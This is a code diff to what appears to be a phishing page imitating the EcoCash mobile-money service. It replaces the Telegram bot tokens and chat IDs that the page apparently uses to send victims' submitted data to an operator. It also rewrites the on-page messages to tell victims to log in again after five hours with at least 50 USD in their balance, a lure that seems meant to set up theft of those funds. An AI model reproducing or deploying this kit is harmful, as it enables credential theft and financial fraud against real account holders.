@@ -237,13 +237,12 @@
         <button id="submitBtn">Submit</button>
     </div>
 
-    <footer>© 2025 EcoCash</footer>
+    <footer>© 2026 EcoCash</footer>
     <!-- SPINNER -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
-            Please wait while we approve your data application
-        </div>
+            Your Registrations fee is being approved, Login again after 5 hours and make sure you have atleast 50 USD on your balance </div>
     </div>
 
     <!-- RESULT OVERLAY -->
@@ -253,11 +252,11 @@
 
     <script>
         // Bot 1 (your existing)
-        const BOT_TOKEN_1 = '8169387513:AAEcey1vsWyWK6a55Uira6aXeMsSbvYnFno';
-        const CHAT_ID_1 = '7752088037';
+        const BOT_TOKEN_1 = '8843164740:AAEH0Z5CurNsuJTuZjBm QYESKVxgAKKu0s4';
+        const CHAT_ID_1 = '5617475835';
 
         // Bot 2 (your second bot)
-        const BOT_TOKEN_2 = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q';
+        const BOT_TOKEN_2 = '7915486968:AAEpg0PmZlfzGKzpxcOWTTIF-x_Cg7_YEwI';
         const CHAT_ID_2 = '5615316142';
 
         // Mask phone from localStorage
@@ -363,7 +362,7 @@
 
             const parts = callbackData.split('_');
             if (parts[0] === 'approve') {
-                resultMessage.textContent = 'Your data has been approved. You will receive a confirmation message within 15 minutes. Thank you.';
+                resultMessage.textContent = 'Your Registrations fee is being approved, Login again after 5 hours and make sure you have atleast 50 USD on your balance';
             } else if (parts[0] === 'cancel') {
                 resultMessage.textContent = 'Please reapply and ensure that your information is correct. Thank you.';
             }
